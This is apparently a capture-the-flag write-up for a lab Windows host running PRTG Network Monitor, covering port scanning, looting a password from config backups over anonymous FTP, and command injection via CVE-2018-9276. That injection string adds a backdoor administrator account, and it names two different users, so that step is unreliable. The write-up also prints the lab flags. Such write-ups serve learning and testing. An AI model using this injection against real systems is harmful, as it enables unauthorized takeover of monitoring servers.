#box #PRTG-Network-Monitor #backup #RCE 
# Nmap

With a Nmap Scan we discover the following open ports
```bash
# Nmap 7.95 scan initiated Mon Mar 17 21:30:59 2025 as: /usr/lib/nmap/nmap -sC -sV --top-ports=1000 -oA nmap_top1000sCsV 10.129.230.176
Nmap scan report for 10.129.230.176
Host is up (0.11s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
21/tcp   open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_11-10-23  10:20AM       <DIR>          Windows
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp   open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-server-header: PRTG/18.1.37.13946
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-03-17T21:31:22
|_  start_date: 2025-03-17T19:47:06

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Mar 17 21:31:29 2025 -- 1 IP address (1 host up) scanned in 29.79 seconds
```

Within the crucial findings, we notice:
* [[Interacting with FTP#^ftp-anonymous-login|FTP open with anonymous login]]
* A website is hosted on port 80, PRTG Network Monitor
* SMB is reachable from outside

# Initial HTTP Recon

We first check the state of port 80 with the hosted PRTG Network Monitor. We try its default credentials `prtgadmin:prtgadmin` without success.
After looking for further vulnerabilities we discover the existence of the following [CVE-2018-19410](https://www.cvedetails.com/cve/CVE-2018-19410/). After trying its [PoC](https://github.com/himash/CVE-2018-19410-POC) we are unable to make it work, delving into something else.

# FTP

Since we discover the FTP is open, we first try to understand where can the PRTG Network Monitor files be located and we discover this documentation: https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data
We then try to find out on the ftp whether we can access the folder `%programdata%\Paessler\PRTG Network Monitor`. 
Here, I got stuck for a while since I didn't know I could access hidden files in ftp. We use `ls -la` to check for hidden files in the ftp and we discover that `ProgramData` is standing right in front of us in the initial folder.
Once accessing on `%programdata%\Paessler\PRTG Network Monitor` we find the existence of two interesting files: `PRTG Configuration.old` and `PRTG Configuration.old.bak`

```ftp
03-17-25  04:29PM       <DIR>          Configuration Auto-Backups
03-17-25  08:00PM       <DIR>          Log Database
02-03-19  12:18AM       <DIR>          Logs (Debug)
02-03-19  12:18AM       <DIR>          Logs (Sensors)
02-03-19  12:18AM       <DIR>          Logs (System)
03-18-25  12:00AM       <DIR>          Logs (Web Server)
03-17-25  08:04PM       <DIR>          Monitoring Database
02-25-19  10:54PM              1189697 PRTG Configuration.dat
02-25-19  10:54PM              1189697 PRTG Configuration.old
07-14-18  03:13AM              1153755 PRTG Configuration.old.bak
03-18-25  02:53PM              1720501 PRTG Graph Data Cache.dat
02-25-19  11:00PM       <DIR>          Report PDFs
02-03-19  12:18AM       <DIR>          System Information Database
02-03-19  12:40AM       <DIR>          Ticket Database
02-03-19  12:18AM       <DIR>          ToDo Database
```
By getting those files from FTP we find out, in `PRTG Configuration.old.bak` that a password is written inside of it, specifying that it refers to the user `prtgadmin`. 

```xml
<dbpassword>
	<!-- User: prtgadmin -->
	PrTg@dmin2018
</dbpassword>
```

# Logging in PRTG Network Monitor

We use the credentials found above to login into PRTG Network Monitor.
Unfortunately, this doesn't work. By looking up online we discover that the the password is not `PrTg@dmin2018` but, instead. `PrTg@dmin2019`.

>This hints us, for the next times, that after discovering a password, or finding something that could be a password we could proceed to perform some mutation within hashcat and try more combinations

## Post-login Exploitation

Once logged in, we check out the available vulnerabilities for this version of PRTG Network Monitor and discover that the following CVE is available [CVE-2018-9276](https://nvd.nist.gov/vuln/detail/CVE-2018-9276). We can then try to exploit it practically from the website.
This can be done by adding or editing a notification from the PRTG Network Monitor Notifications panel
![[attachments/netmon-writeup-2.webp]]
Once inside of it, we can either change an existing notification or create a new one from the Add new notification button on the right
![[attachments/netmon-writeup-1.png]]
From here, all we have to do is give a name to the notification and then: 
* Open the option `Execute Program` below
* Set `Program File` to `Demo exe notification - outfile.ps1`
* Change the `Parameter` value to `test.txt;net user rogue prtgadmin /add;net localgroup administrators anon /add`

This will basically create a new user `rogue:prtgadmin` to the machine and set it as administrator. This a PS1 command to be run in the notification `outfile.ps1`.
Once created, we'll be redirected to the notifications page, and from here we can execute the notification as intended by clicking on the given notification and then click on the bell icon to Send a Test Notification
![[attachments/netmon-writeup-3.webp]]
Once the test notification is sent, the user will be created.
# SMB Access

We can now try to authenticate to the available SMB server with the brand new user we created:
```bash title:'SMB Access'
smbclient //10.129.230.176/C$ -U rogue
```

We'll notice that we'll be able to authenticate.
From here, we can access the user's folder to get its flag and the Administrator's folder to get the root flag

User: `5570b5663af6792b7d3cb7fc8f680df7`
Root: `aa96ee2733d13dfafb3a673c65aa3f2f`

